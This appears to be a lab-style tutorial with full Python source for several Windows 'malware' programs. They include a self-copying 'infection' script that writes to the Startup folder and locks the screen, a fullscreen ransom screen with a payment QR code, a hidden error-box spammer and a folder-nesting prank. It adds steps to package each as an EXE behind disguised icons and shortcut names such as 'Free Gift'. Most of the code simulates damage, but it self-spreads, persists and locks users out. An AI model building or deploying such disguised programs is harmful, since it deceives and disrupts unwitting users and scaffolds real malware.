
## MALWARE

### Step 2: Setup your Virtual Environment

To activate:
```bash 
python -m venv venv
```

```bash
venv\Scripts\activate
```
 ### Step 3: Install Required Libraries

```bash
pip install pygame
```

### Step 4: infecto.py

```bash
import os, shutil, random, time, datetime, tkinter as tk, pygame
from threading import Thread

# ===== CONFIG =====
TARGET_DIRS = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Documents"),
    "C:\\Temp"
]
FAKE_EXT = ".infected"
ALARM_FILE = os.path.join(os.path.dirname(__file__), "alert.wav")
SIM_DURATION = 20
SAVE_DIR = os.path.expanduser("~/Desktop")  # infection_log.txt will be saved here
# ==================

log = []

def log_event(event, box=None):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    entry = f"[{ts}] {event}"
    log.append(entry)
    print(entry)
    if box:
        box.insert(tk.END, entry + "\n")
        box.see(tk.END)

def save_log():
    """Save IOC log to Desktop after infection ends"""
    try:
        fname = os.path.join(SAVE_DIR, "infection_log.txt")
        with open(fname, "w") as f:
            for entry in log:
                f.write(entry + "\n")
        print(f"[+] Infection log saved at: {fname}")
    except Exception as e:
        print(f"[!] Could not save log: {e}")

def spread_self(log_box=None):
    exe_path = os.path.abspath(__file__)
    for d in TARGET_DIRS:
        try:
            os.makedirs(d, exist_ok=True)
            target = os.path.join(d, f"win_patch_{random.randint(1000,9999)}.py")
            shutil.copy(exe_path, target)
            log_event(f"Copied to {target}", log_box)
        except Exception as e:
            log_event(f"Spread failed: {e}", log_box)

def infect_files(log_box=None):
    for d in TARGET_DIRS:
        try:
            for fname in os.listdir(d):
                fpath = os.path.join(d, fname)
                if os.path.isfile(fpath) and not fpath.endswith(FAKE_EXT):
                    infected = fpath + FAKE_EXT
                    shutil.copy(fpath, infected)
                    log_event(f"File infected: {infected}", log_box)
        except:
            pass

def simulate_persistence(log_box=None):
    try:
        startup = os.path.join(os.getenv("APPDATA"), r"Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        os.makedirs(startup, exist_ok=True)
        dummy = os.path.join(startup, "startup_infect.bat")
        with open(dummy, "w") as f:
            f.write("echo Fake persistence simulation - no real damage.")
        log_event(f"Persistence simulated at: {dummy}", log_box)
    except Exception as e:
        log_event(f"Persistence failed: {e}", log_box)

def play_alert():
    try:
        pygame.mixer.init()
        pygame.mixer.music.load(ALARM_FILE)
        pygame.mixer.music.play(-1)
        print(f"[+] Playing sound from {ALARM_FILE}")
    except Exception as e:
        log_event(f"Alert sound error: {e}")

# --- Fullscreen infection GUI ---
def infection_screen():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(bg="black")
    root.wm_attributes("-topmost", 1)

    # disable exit + keyboard
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.bind_all("<Key>", lambda e: "break")
    root.bind_all("<Alt-Key>", lambda e: "break")

    warning = tk.Label(
        root,
        text="⚠️ YOUR PC HAS BEEN INFECTED ⚠️",
        fg="red",
        bg="black",
        font=("Consolas", 42, "bold")
    )
    warning.place(relx=0.5, rely=0.3, anchor="center")

    submsg = tk.Label(
        root,
        text="Do not turn off your computer.\nFiles are being corrupted...",
        fg="yellow",
        bg="black",
        font=("Consolas", 20)
    )
    submsg.place(relx=0.5, rely=0.42, anchor="center")

    log_box = tk.Text(root, height=15, width=95, bg="black", fg="lime", font=("Consolas", 12))
    log_box.place(relx=0.5, rely=0.75, anchor="center")

    # Animation vars
    direction = 1
    y_pos = 0.3
    start_time = time.time()

    while time.time() - start_time < SIM_DURATION:
        # Move the red warning up and down
        y_pos += 0.003 * direction
        if y_pos > 0.35 or y_pos < 0.25:
            direction *= -1
        warning.place(relx=0.5, rely=y_pos, anchor="center")

        # Fake infection events
        if random.random() < 0.25:
            fake_event = random.choice([
                "Injected into explorer.exe",
                "Modified registry key HKCU\\Run",
                "Spawned process: svchost32.exe",
                "Spreading to Documents folder",
                "Memory hook installed"
            ])
            log_event(fake_event, log_box)

        root.update()
        time.sleep(0.2)

    root.destroy()
    save_log()  

# --- MAIN ---
def main():
    Thread(target=spread_self, daemon=True).start()
    Thread(target=infect_files, daemon=True).start()
    Thread(target=simulate_persistence, daemon=True).start()
    Thread(target=play_alert, daemon=True).start()
    infection_screen()

if __name__ == "__main__":
    main()

```

## Creating a EXE FILE
#### 1. Convert Script to EXE

Prepare the Icon

#### Go to: https://www.iconarchive.com/
##### Download and Rename the file (example: infecto.ico).
##### Move it to the same folder as your infecto.py.
##### Take note: whatever you name the .ico file is what you must also put in the PyInstaller command.

Paste this: 
```bash
pip install pyinstaller
```
```bash
pyinstaller --onefile --windowed --icon=infecto.ico infecto.py
```
#### 2. Create the Desktop Shortcut
- Right-click Desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\LAB\InfectoV\dist\infecto.exe
- Right-click the shortcut → Properties → Change Icon
- Select your infecto.ico.

# Ransomware

## Install PyInstaller
```bash
 pip install pyinstaller
```
## Ransom.py
```bash
import os
import sys
import json
import time
import datetime
import random
from threading import Thread
from PIL import Image, ImageTk
import tkinter as tk
from tkinter import messagebox

# ==============================
# PYINSTALLER-SAFE RESOURCE PATH
# ==============================
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS  # PyInstaller temp folder
    except AttributeError:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, relative_path)

# ==============================
# GLOBALS
# ==============================
VICTIM_ID = f"SIM-{random.randint(10000,99999)}"
SIM_DURATION = 90
QR_FILE = resource_path("qrc (2).jpg")
EVIDENCE_DIR = os.path.join(os.getcwd(), "sim_evidence")
os.makedirs(EVIDENCE_DIR, exist_ok=True)

# ==============================
# IOC GENERATION
# ==============================
def generate_mock_iocs():
    now = datetime.datetime.now().isoformat()
    return [
        {"timestamp": now, "type": "process_creation", "detail": "ransomware.exe (simulated)"},
        {"timestamp": now, "type": "file_marker", "detail": "Resume.docx.locked"},
        {"timestamp": now, "type": "file_marker", "detail": "Vacation.jpg.locked"},
        {"timestamp": now, "type": "network_beacon", "detail": "beacon to 10.10.10.10 (simulated)"}
    ]

def save_evidence(iocs):
    fname = os.path.join(EVIDENCE_DIR, f"evidence_{int(time.time())}.json")
    report = {
        "victim_id": VICTIM_ID,
        "generated_at": datetime.datetime.now().isoformat(),
        "iocs": iocs,
        "note": "Simulated evidence for lab only."
    }
    with open(fname, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)
    return fname

# ==============================
# GUI
# ==============================
def run_gui():
    root = tk.Tk()
    root.title("Ooops, your files have been encrypted!")
    root.configure(bg="#232224")
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.overrideredirect(True)

    def lock_focus():
        while True:
            try:
                root.focus_force()
                root.lift()
            except:
                break
            time.sleep(0.4)

    Thread(target=lock_focus, daemon=True).start()

    banner = tk.Frame(root, bg="#a60d0d", height=47)
    banner.pack(fill="x")
    tk.Label(banner, text="Ooops, your files have been encrypted!", bg="#a60d0d",
             fg="white", font=("Segoe UI", 16, "bold")).pack(side="left", padx=30)
    tk.Label(banner, text=f"Victim ID: {VICTIM_ID}", bg="#a60d0d",
             fg="#ffd0d0", font=("Consolas", 12)).pack(side="right", padx=30)

    card = tk.Frame(root, bg="#1c1919", bd=2, relief="ridge")
    card.pack(padx=25, pady=25, fill="both", expand=True)

    left = tk.Frame(card, bg="#7a0909", width=215)
    left.pack(side="left", fill="y")
    left.pack_propagate(False)

    lock_canvas = tk.Canvas(left, width=97, height=97, bg="#7a0909", highlightthickness=0)
    lock_canvas.create_oval(8, 8, 89, 89, fill="#fff", outline="#bdbaba")
    lock_canvas.create_rectangle(37, 44, 69, 85, fill="#7a0909", outline="#7a0909")
    lock_canvas.create_arc(24, 18, 82, 60, start=0, extent=180, style="arc",
                           outline="#7a0909", width=7)
    lock_canvas.pack(pady=17)

    def make_timer_box(parent, title, date_val):
        frame = tk.Frame(parent, bg="#7a0909")
        frame.pack(pady=7, padx=10, fill="x")
        tk.Label(frame, text=title, bg="#7a0909", fg="#ffeeee",
                 font=("Segoe UI", 12, "bold")).pack(anchor="w")
        date_lbl = tk.Label(frame, text=date_val, bg="white",
                            fg="#2d2929", font=("Consolas", 13, "bold"), width=23)
        date_lbl.pack(pady=(3, 0))
        timer_lbl = tk.Label(frame, text="00:00:00", bg="black",
                             fg="#ff3939", font=("Consolas", 14, "bold"), width=23)
        timer_lbl.pack(pady=(2, 6))
        return date_lbl, timer_lbl

    payment_deadline = (datetime.datetime.now() + datetime.timedelta(minutes=2)).strftime("%Y-%m-%d %H:%M:%S")
    file_loss_deadline = (datetime.datetime.now() + datetime.timedelta(minutes=3)).strftime("%Y-%m-%d %H:%M:%S")

    raise_date_lbl, raise_timer_lbl = make_timer_box(left, "Payment required before:", payment_deadline)
    lost_date_lbl, lost_timer_lbl = make_timer_box(left, "Files WILL BE LOST after:", file_loss_deadline)

    tk.Label(left, text="System monitored. DO NOT TURN OFF.",
             bg="#7a0909", fg="#ffd0d0", font=("Segoe UI", 10),
             wraplength=180).pack(pady=9)

    right = tk.Frame(card, bg="#19181b")
    right.pack(side="left", fill="both", expand=True, padx=30, pady=13)

    content = (
        "All files on this computer have been encrypted.\n"
        "Extension '.locked' is added to every affected file.\n\n"
        "To restore access:\n"
        "  1. Scan the QR code below using a mobile payment app.\n"
        "  2. Send the exact amount demanded.\n"
        "  3. Click 'Check Payment' below.\n\n"
        "WARNING:\n"
        "  - Do NOT modify encrypted files.\n"
        "  - Antivirus removal will NOT recover your data.\n"
        "  - Deadline failure = permanent loss."
    )

    tk.Label(right, text=content, bg="#19181b", fg="#ededed",
             font=("Segoe UI", 13), justify="left",
             anchor="nw", wraplength=480).pack(pady=10)

    qr_container = tk.Frame(right, bg="#19181b")
    qr_container.pack(pady=6)

    if os.path.exists(QR_FILE):
        img = Image.open(QR_FILE).resize((180, 180), Image.LANCZOS)
        tk_qr = ImageTk.PhotoImage(img)
        lbl_qr = tk.Label(qr_container, image=tk_qr, bg="#19181b")
        lbl_qr.image = tk_qr
        lbl_qr.pack()
    else:
        tk.Label(qr_container, text="[PAYMENT QR NOT FOUND]",
                 bg="#19181b", fg="red",
                 font=("Segoe UI", 13)).pack(pady=38)

    status = tk.Label(right, text="Scan code above to pay ransom.",
                      bg="#19181b", fg="#ffd15f",
                      font=("Consolas", 11, "bold"))
    status.pack(pady=8)

    def countdown():
        start = time.time()
        while time.time() - start < SIM_DURATION:
            remain = int(SIM_DURATION - (time.time() - start))
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            raise_timer_lbl.config(text=time.strftime("%H:%M:%S", time.gmtime(remain)))
            lost_timer_lbl.config(text=time.strftime("%H:%M:%S", time.gmtime(max(0, remain - 30))))
            status.config(text=f"Time left: {remain}s | {now}")
            time.sleep(1)
        status.config(text="DEADLINE PASSED. FILES LOST.")

    Thread(target=countdown, daemon=True).start()
    root.mainloop()

def main():
    run_gui()

if __name__ == "__main__":
    main()

```bash
 pyinstaller --onefile --windowed --icon=winrar.ico --add-data "qrc (2).jpg;." rans.py```



### VIRUS: Fake_error.py
```bash
import random
import time
import win32gui
import win32con
import ctypes
import sys
from threading import Thread

# ===== CONFIG =====
MAX_SPEED = True          # Set to False for less aggressive spamming
HIDE_CONSOLE = True      # Run completely in background
# ==================


ERROR_MESSAGES = [
    "CRITICAL SYSTEM FAILURE: Hoy, magbayad ka na ng utang mo!",
    "VIRUS ALERT: May balance ka pa sa utang mo!",
    "BSOD IMMINENT: 0x0000007B Mabagal ang iyong PC",
    "ERROR: Kulang ka sa tulog at pagmamahal.",
    "WARNING: Nag-ooverheat na CPU mo.",
    "ALERT: Puno na ang memory, i-delete mo na mga screenshot ng ex mo!",
    "SYSTEM32 DELETION IN PROGRESS: 37% complete",
    "CRITICAL: Kailangan ko ng pera, pera, pera",
    "ERROR: May virus na galing sa pag-download ng 'FreeIphone.exe'!",
    "404: Utang na loob, bayaran mo na!",
    "ALERT:  Naubos ang RAM kasi bukas lahat ng tabs ng Chrome!",
    "FATAL ERROR: Storage full, i-delete mo na yung 100 selfies sa jeep!",
]

def show_error():
    """Shows a fake error message"""
    title = random.choice([
        "Microsoft Windows",
        "System Alert",
        "CRITICAL ERROR",
        "Virus Protection",
        "IT Department"
    ])
    
    style = random.choice([
        win32con.MB_ICONERROR | win32con.MB_SYSTEMMODAL,
        win32con.MB_ICONWARNING | win32con.MB_SYSTEMMODAL,
        win32con.MB_ICONINFORMATION | win32con.MB_SYSTEMMODAL
    ])
    
    win32gui.MessageBox(
        0,
        random.choice(ERROR_MESSAGES),
        title,
        style
    )

def hide_console():
    """Completely hides the console window"""
    ctypes.windll.user32.ShowWindow(
        ctypes.windll.kernel32.GetConsoleWindow(),
        0
    )

def main():
    if HIDE_CONSOLE:
        hide_console()
    
    # Calculate delay based on intensity
    delay = 0.1 if MAX_SPEED else random.uniform(0.5, 1.5)
    
    # Main spamming loop
    while True:
        try:
            # Spawn multiple error threads for maximum chaos
            for _ in range(random.randint(1, 3 if MAX_SPEED else 1)):
                Thread(target=show_error).start()
            
            time.sleep(delay)
        except:
            pass

if __name__ == "__main__":
    # Make sure only one instance runs
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "FakeErrorMutex")
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit()
        
        main()
    finally:
        if 'mutex' in locals():
            ctypes.windll.kernel32.CloseHandle(mutex)
```

Run it:
```bash
python fake_error.py
```

Creating a Clickable Desktop Icon
#### #1 Convert Script to EXE

- Navigate to this link: https://www.iconarchive.com/
- Search your desired icon. For example: winrar
- Click All Downloads Format
- Choose Windows: Download ICO
- Rename the file into winrar
- Move the winrar.ico to your folder

In your terminal, paste this:
```bash
pip install pyinstaller
pyinstaller --onefile --windowed --icon=error.ico fake_error.py
```
#### #2 Create the Desktop Shortcut
- Right-click desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\malware\virus3\dist\fake_error.exe
- Name it "Confidential Files"

# Virus 3 Infinite Folder

### Step 1: Inside the malware folder add a new folder (vs code) name it virus3

### Step 2: Setup your Virtual Environment
Open vs code and in the terminal move out of directory:
```bash
cd ..
```
```bash
cd virus3
````
Install Required Library
```bash
pip install pywin32
```

### Step 3: infinitefolder_prank.py.

```bash
import os
import time
import shutil
from threading import Thread

# ===== CONFIG =====
FOLDER_NAME = "FOLDER_INVASION"    # Name of the main folder
DELAY_SECONDS = 0.3                # Speed of appearance (0.3s is optimal)
TOTAL_FOLDERS = 50                 # Total folders to create (stops automatically)
# ==================

def get_desktop_path():
    """Get the correct Desktop path (works with OneDrive too)"""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(desktop):
        desktop = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
    return desktop

def create_visible_folders():
    """Creates folders that visibly appear on Desktop"""
    desktop = get_desktop_path()
    root_path = os.path.join(desktop, FOLDER_NAME)
    
    # Clear previous run if exists
    if os.path.exists(root_path):
        shutil.rmtree(root_path)
    
    # Create initial folder
    os.makedirs(root_path)
    
    # Create nested folders
    current_path = root_path
    for i in range(1, TOTAL_FOLDERS + 1):
        current_path = os.path.join(current_path, f"FOLDER_{i}")
        os.makedirs(current_path)
        
        # Force folder refresh on Windows
        if os.name == 'nt':
            os.system(f'explorer /select,"{current_path}"')
        
        print(f"Created: {current_path}")  # Console log
        time.sleep(DELAY_SECONDS)

if __name__ == "__main__":
    print("\n=== VISIBLE FOLDER PRANK ===")
    print(f"Creating {TOTAL_FOLDERS} folders on Desktop...\n")
    print("Watch them appear in real-time!")
    print("Press CTRL+C to stop early\n")
    
    try:
        create_visible_folders()
    except KeyboardInterrupt:
        print("\nStopped by user!")
    finally:
        print(f"\nDone! Check your Desktop for '{FOLDER_NAME}'")
        print("To delete: Right-click the folder and select 'Delete'")
```

Run it:
```bash
python infinitefolder_prank.py
```
Creating a Clickable Desktop Icon
#### #1 Convert Script to EXE

- Navigate to this link: https://www.iconarchive.com/
- Search your desired icon. For example: gift
- Click All Downloads Format
- Choose Windows: Download ICO
- Rename the file into gift
- Move the gift.ico to your folder

In your terminal, paste this:
```bash
pip install pyinstaller
pyinstaller --onefile --windowed --icon=gift.ico infinitefolder_prank.py
```
#### #2 Create the Desktop Shortcut
- Right-click desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\malware\virus2\dist\infinitefolder_prank.exe
- Name it "Free Gift"

